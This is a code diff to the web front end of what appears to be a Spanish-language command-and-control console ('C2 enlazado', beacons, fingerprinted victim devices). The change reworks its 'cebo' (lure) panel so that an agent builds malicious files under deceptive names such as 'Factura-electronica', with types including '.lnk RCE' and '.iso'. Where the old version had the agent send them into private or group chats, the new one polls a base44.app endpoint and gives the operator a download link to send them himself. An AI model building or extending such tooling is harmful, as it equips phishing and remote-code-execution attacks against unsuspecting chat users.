@@ -333,21 +333,18 @@ footer .sep{color:#262b33}
         <span class="st" id="h2E3">ARMADO — esperando</span>
       </div>
     </div>
-    <div class="sech" style="margin-top:10px"><div class="sq"></div><h2>ENVÍO DE CEBOS</h2><span class="meta" id="ceboSt">elige el nombre</span></div>
+    <div class="sech" style="margin-top:10px"><div class="sq"></div><h2>CREAR CEBO</h2><span class="meta" id="ceboSt">elige el nombre</span></div>
     <div class="panel"><div style="padding:8px 10px">
-      <div style="font-size:9px;color:#8b919b;line-height:1.6;margin-bottom:6px">el archivo se genera con el nombre que elijas y se envía al chat lab. el agente lo ejecuta y confirma acá.</div>
+      <div style="font-size:9px;color:#8b919b;line-height:1.6;margin-bottom:6px">el agente fabrica el archivo con el nombre que elijas. vos lo descargás y lo enviás desde el chat que corresponda — el backend no envía nada.</div>
       <input id="ceboNombre" placeholder="ej: Factura-electronica" style="width:100%;box-sizing:border-box;background:#121418;border:1px solid #000;color:#e6edf3;font-size:11px;padding:8px;border-radius:2px;font-family:inherit">
       <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap">
         <div class="fabbtn" onclick="ceboExt('lnk')">.lnk RCE</div>
         <div class="fabbtn" onclick="ceboExt('iso')">.iso contenedor</div>
         <div class="fabbtn" onclick="ceboExt('diagpkg')">.diagpkg inerte</div>
-      </div>
-      <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;align-items:center">
-        <div class="fabbtn" id="ceboChatP" onclick="ceboChat('P')">PRIVADO</div>
-        <div class="fabbtn" id="ceboChatG" onclick="ceboChat('G')">GRUPO</div>
-        <div class="fabbtn red" style="margin-left:auto" onclick="ceboEnviar()">▸ ENVIAR</div>
+        <div class="fabbtn red" style="margin-left:auto" onclick="ceboCrear()">▸ CREAR</div>
       </div>
       <div id="ceboRes" style="font-size:9px;color:#8b919b;margin-top:8px"></div>
+      <a id="ceboDl" href="#" download="" style="display:none;margin-top:8px;text-decoration:none;font-size:10px;letter-spacing:1px;color:#f2d3d1;border:1px solid #7a4a45;background:linear-gradient(180deg,#2a1d1c,#1a1312);padding:8px 12px;border-radius:2px">▸ DESCARGAR CEBO</a>
     </div></div>
     <div class="sech" style="margin-top:10px"><div class="sq"></div><h2>USUARIOS IDENTIFICADOS</h2><span class="meta" id="h2UsersN">0</span></div>
     <div class="panel"><div class="log" id="h2Users"><div style="font-size:9px;color:#5c626c;padding:8px 10px">cada dispositivo/usuario que reporte al C2 aparece acá con su huella única</div></div></div>
@@ -364,7 +361,7 @@ footer .sep{color:#262b33}
   <span>SYNC <b id="ftSync">--:--:--</b></span><span class="sep">|</span>
   <span>BEACONS <b id="ftB">0</b></span><span class="sep">|</span>
   <span>UPTIME <b id="ftU">00:00:00</b></span><span class="sep">|</span>
-  <span id="ftVer">RC-T20 vRC16 · MOTOR CLONE v13.4</span>
+  <span id="ftVer">RC-T20 vRC17 · MOTOR CLONE v13.4</span>
 </footer>
 <div id="modal">
   <div class="mbox">
@@ -449,18 +446,33 @@ function applyOp(op) {
   switchTab(op === 'h2' ? 'h2' : 'tgts');
 }
 document.querySelectorAll('.opbtn').forEach(b => b.addEventListener('click', () => applyOp(b.dataset.op)));
-let ceboTipo = 'lnk', ceboDest = 'P';
-function ceboExt(t) { ceboTipo = t; $('ceboSt').textContent = 'tipo .' + t + ' → elegí destino'; $('ceboNombre').placeholder = 'ej: Factura-electronica.' + t; }
-function ceboChat(d) { ceboDest = d; $('ceboChatP').style.outline = d === 'P' ? '1px solid #7a4a45' : 'none'; $('ceboChatG').style.outline = d === 'G' ? '1px solid #7a4a45' : 'none'; $('ceboSt').textContent = 'destino ' + (d === 'P' ? 'privado' : 'grupo') + ' → ENVIAR'; }
-function ceboEnviar() {
+let ceboTipo = 'lnk', ceboPoll = null;
+function ceboExt(t) { ceboTipo = t; $('ceboSt').textContent = 'tipo .' + t + ' → CREAR'; $('ceboNombre').placeholder = 'ej: Factura-electronica.' + t; }
+function ceboCrear() {
   let n = ($('ceboNombre').value || '').trim();
   if (!n) { $('ceboRes').textContent = 'escribí un nombre'; return; }
   if (n.slice(-(ceboTipo.length + 1)) !== '.' + ceboTipo) n = n + '.' + ceboTipo;
-  const pedido = { nombre: n, tipo: '.' + ceboTipo, chat: ceboDest === 'P' ? 'privado' : 'grupo', ts: hhmmss() };
-  $('ceboRes').textContent = 'enviando pedido...';
-  fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ marker: 'H2-CEBO-PEDIDO', ua: 'consola-owner', extra: JSON.stringify(pedido) }) })
-    .then(() => { $('ceboRes').textContent = '✓ pedido: ' + n + ' → ' + pedido.chat + '. el agente lo manda y confirma'; $('ceboRes').style.color = '#f2d3d1'; })
+  $('ceboDl').style.display = 'none';
+  $('ceboRes').textContent = 'fabricando ' + n + '...';
+  fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ marker: 'H2-CEBO-CREAR', ua: 'consola-owner', extra: JSON.stringify({ nombre: n, tipo: '.' + ceboTipo, ts: hhmmss() }) }) })
+    .then(() => { $('ceboRes').textContent = '✓ pedido al agente: ' + n + ' — esperando el archivo...'; $('ceboRes').style.color = '#f2d3d1'; ceboEsperar(n); })
     .catch(e => { $('ceboRes').textContent = 'fallo: ' + e.message; $('ceboRes').style.color = '#f2d3d1'; });
+}
+function ceboEsperar(nombre) {
+  if (ceboPoll) clearInterval(ceboPoll);
+  let intentos = 0;
+  ceboPoll = setInterval(() => {
+    intentos++;
+    fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Status', { method: 'POST' })
+      .then(r => r.json()).then(j => {
+        const listo = (j.beacons || []).filter(b => String(b.marker) === 'H2-CEBO-LISTO' && String(b.extra || '').indexOf('"nombre":"' + nombre + '"') !== -1).pop();
+        if (listo) {
+          clearInterval(ceboPoll);
+          try { const ex = JSON.parse(listo.extra); if (ex.url) { $('ceboDl').href = ex.url; $('ceboDl').style.display = 'inline-block'; $('ceboRes').textContent = '✓ listo: ' + nombre + ' — descargalo y envialo vos desde el chat'; return; } } catch (e) {}
+          $('ceboRes').textContent = '✓ generado: ' + nombre + ' (link vencido, crea de nuevo)';
+        } else if (intentos > 60) { clearInterval(ceboPoll); $('ceboRes').textContent = 'timeout esperando el archivo, reintenta'; }
+      }).catch(e => {});
+  }, 3000);
 }
 ceboExt('lnk');
 function renderH2() {
@@ -932,7 +944,7 @@ setInterval(() => {
 }, 1000);
 
 applyOp(localStorage.getItem('t20v8_op') || 't20');
-logAdd('RC-T20 vRC16 en línea · motor de clonación v13.4 · C2 enlazado', 'warn');
+logAdd('RC-T20 vRC17 en línea · motor de clonación v13.4 · C2 enlazado', 'warn');
 renderAll();
 poll();
 </script>
